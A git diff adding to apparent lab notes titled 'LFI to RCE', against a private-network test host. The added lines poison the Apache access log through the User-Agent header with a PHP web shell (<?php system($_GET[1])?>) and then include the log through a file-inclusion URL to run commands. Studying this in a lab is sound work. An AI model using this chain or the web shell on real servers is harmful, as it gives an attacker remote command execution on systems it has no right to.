@@ -164,5 +164,13 @@ LFI to RCE
     # Parrot:
     http://192.168.0.10/inc.php?file=info.php
 ![image](https://github.com/user-attachments/assets/28387bd5-ca33-4eaf-8dcf-29e56f688407)
+![image](https://github.com/user-attachments/assets/a8db145f-bb93-4ce9-946f-243730f1366f)
 
+    chmod 775 -R /var/log/apache2
+    http://192.168.0.10/inc.php?file=/var/log/apache2/access.log
+![image](https://github.com/user-attachments/assets/47c38770-b16b-4a50-b8d2-99d7971ef85e)
+![image](https://github.com/user-attachments/assets/81448441-ee04-4833-9858-d7ec699f282c)
 
+    變更user-agent
+    <?php system($_GET[1])?>
+![image](https://github.com/user-attachments/assets/adfbbf8e-39f5-4a64-9de4-791084eaffe3)
